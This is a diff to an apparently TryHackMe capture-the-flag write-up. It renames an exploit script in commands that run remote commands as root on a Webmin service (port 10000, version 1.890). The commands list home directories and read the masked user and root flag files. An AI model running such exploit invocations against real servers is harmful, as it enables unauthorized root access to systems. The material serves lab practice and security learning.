@@ -111,7 +111,7 @@ And we got access with root.
 For user:
 
 ```bash
-❯ python fuck.py -host $IP -port 10000 -cmd "ls /home"
+❯ python script.py -host $IP -port 10000 -cmd "ls /home"
 
 ╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
 ║║║├┤ ├┴┐│││││││
@@ -124,7 +124,7 @@ dark
 
 
 ~/dev/Python via  v3.13.3 (myenv)
-❯ python fuck.py -host $IP -port 10000 -cmd "ls /home/dark"
+❯ python script.py -host $IP -port 10000 -cmd "ls /home/dark"
 
 ╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
 ║║║├┤ ├┴┐│││││││
@@ -138,7 +138,7 @@ webmin_1.890_all.deb
 
 
 ~/dev/Python via  v3.13.3 (myenv)
-❯ python fuck.py -host $IP -port 10000 -cmd "cat /home/dark/user.txt"
+❯ python script.py -host $IP -port 10000 -cmd "cat /home/dark/user.txt"
 
 ╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
 ║║║├┤ ├┴┐│││││││
@@ -153,7 +153,7 @@ THM{*******************}
 For root:
 
 ```bash
-❯ python fuck.py -host $IP -port 10000 -cmd "cat /root/root.txt"
+❯ python script.py -host $IP -port 10000 -cmd "cat /root/root.txt"
 
 ╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
 ║║║├┤ ├┴┐│││││││
